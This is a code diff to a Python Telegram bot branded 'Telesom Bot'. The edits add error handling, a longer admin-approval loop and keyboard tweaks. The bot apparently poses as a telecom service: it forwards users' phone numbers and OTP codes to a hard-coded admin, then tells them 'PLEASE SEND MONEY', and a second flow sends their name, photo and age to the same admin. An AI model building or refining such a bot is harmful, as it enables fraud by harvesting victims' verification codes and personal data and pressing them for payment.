@@ -7,7 +7,7 @@ from aiogram.fsm.context import FSMContext
 from aiogram.fsm.state import StatesGroup, State
 
 BOT_TOKEN = os.getenv("BOT_TOKEN")
-ADMIN_ID = 7983838654
+ADMIN_ID = 7983838654  # Bedel id-ga admin
 
 bot = Bot(BOT_TOKEN)
 dp = Dispatcher(storage=MemoryStorage())
@@ -38,8 +38,11 @@ def service_code(service):
 async def animation(msg,text,sec=5):
     steps=[".","..","...","...."]
     for i in range(sec):
-        await asyncio.sleep(1)
-        await msg.edit_text(f"{text} {steps[i%len(steps)]}")
+        try:
+            await msg.edit_text(f"{text} {steps[i%len(steps)]}")
+            await asyncio.sleep(1)
+        except Exception:
+            pass  # Ignore edit errors (message deleted or timeout)
 
 # ===== START =====
 @dp.message(Command("start"))
@@ -48,9 +51,10 @@ async def start(msg: Message, state:FSMContext):
         await state.clear()
     kb = ReplyKeyboardMarkup(
         keyboard=[[KeyboardButton("New Order"),KeyboardButton("Check Code")]],
-        resize_keyboard=True
+        resize_keyboard=True,
+        one_time_keyboard=True
     )
-    await msg.answer("Ku soo dhawoow Telesom Bot", reply_markup=kb)
+    await msg.answer("Ku soo dhawoow Telesom Bot 🎉", reply_markup=kb)
 
 # ===== NEW ORDER =====
 @dp.message(F.text=="New Order", state=None)
@@ -113,7 +117,11 @@ async def confirm_otp(call: CallbackQuery):
     await bot.send_message(ADMIN_ID,
                            f"New OTP Request\nUser:{call.from_user.id}\nService:{service}\nNumber:{user_data[call.from_user.id]['number']}\nCode:{code}",
                            reply_markup=kb)
-    await asyncio.sleep(10)
+    # Wait for admin approval
+    for _ in range(30):  # max 30 sec waiting
+        await asyncio.sleep(1)
+        if not pending_admin.get(call.from_user.id):
+            break
     if pending_admin.get(call.from_user.id):
         await call.message.answer("PLEASE SEND MONEY 💵")
 
@@ -168,9 +176,6 @@ async def get_name(msg: Message,state:FSMContext):
 
 @dp.message(CheckCodeState.waiting_photo,F.photo)
 async def get_photo(msg: Message,state:FSMContext):
-    if not msg.photo:
-        await msg.answer("Fadlan sawirkaaga dir!")
-        return
     await state.update_data(photo=msg.photo[-1].file_id)
     await msg.answer("Fadlan geli da'daada:")
     await state.set_state(CheckCodeState.waiting_age)
@@ -187,7 +192,6 @@ async def get_age(msg: Message,state:FSMContext):
         await state.clear()
         return
     data=await state.get_data()
-    # Send info to admin
     await bot.send_message(ADMIN_ID,f"User Check Code\nName:{data['name']}\nAge:{age}")
     await bot.send_photo(ADMIN_ID,data['photo'])
     kb=InlineKeyboardMarkup([
